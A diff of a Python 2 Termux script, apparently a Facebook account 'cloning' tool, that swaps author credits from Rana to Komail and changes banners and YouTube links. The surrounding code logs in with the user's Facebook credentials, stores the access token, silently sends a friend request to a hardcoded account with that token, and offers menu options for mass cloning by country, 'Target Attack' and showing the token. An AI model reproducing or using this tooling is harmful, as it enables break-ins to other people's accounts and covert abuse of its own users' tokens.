@@ -1,6 +1,6 @@
 ﻿#!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Rana Aahil
+#The Credit For This Code Goes To Komail Khan
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.001)
 
-#Dev:Rana
+#Dev:Komail
 ##### LOGO #####
 logo = """
 \033[1;96m-.▀██▀
@@ -84,7 +84,7 @@ logo = """
      ────▄██████████▀▀▀▀▀▀▀▀▀▀██████▀████▄────
      ──▄██▀████████▄─────────────▀▀████─▀██▄──
      ─▀██▄▄██████████████████▄▄▄─────────▄██▀─
-     ───▀█████████████████████████▄────▄██▀───
+     ───▀███████████Komail█████████▄────▄██▀───
      ─────▀████▀▀▀▀▀▀▀▀▀▀▀▀█████████▄▄██▀─────
      ───────▀███▄──────────────▀██████▀───────
      ─────────▀██████▄─────────▄████▀─────────
@@ -92,7 +92,7 @@ logo = """
      ──────────────▀████▀▀▀████▀──────────────
      ────────────────▀███▄███▀────────────────
      ───────────────────▀█▀──────────────────
-\033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"""
+\033[1;97m:✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;93mBlackTiger\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -156,10 +156,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
 
 def login():
 	os.system('clear')
@@ -173,8 +173,8 @@ def login():
 		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )
 		jalan(' \033[1;93mWarning: \033[1;92mTermux All Version Working' )
                 jalan(' \033[1;91mWarning: \033[1;95mTermux Data Clear Everyday' ) 
-                jalan(' \033[1;91mWarning: \033[1;95mTool Update Everyday 👆' )                
-		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+                jalan(' \033[1;91mWarning: \033[1;95mTool Update Weekly' )                
+		print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;92mWhite-Tiger-Komail\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"
 		print('\033[1;97m═\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m═' )
 		print('	' )
 		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
@@ -206,7 +206,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -248,24 +248,24 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Rana
+	os.system("clear") #Dev:Komail
 	print logo
-	print "\033[1;97m«--•◄►••◄►•--\033[1;93mLogged in User Info\033[1;97m---•◄►••◄►•---»"
-	print "	   \033[1;93m ◄►••◄►Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
-	print "	   \033[1;93m ◄►••◄►ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
-	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;91mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
-	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Tiger   Massage "
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
-	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
+	print "\033[1;97m«-✮❂❂❂✮-\033[1;93mLogged in User Info\033[1;97m-✮❂❂❂✮-»"
+	print "	   \033[1;93m ✮❂❂❂✮Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
+	print "	   \033[1;93m ✮❂❂❂✮ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
+	print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mWhite-Tiger-Komail\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"
+	print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m9.\x1b[1;91m White Tiger   Massage "
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
+        print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
+	print "\033[1;91m-✮❂❂✮-\033[1;97m> \033[1;97m0.\033[1;91m logout "
 	pilih()
 
 
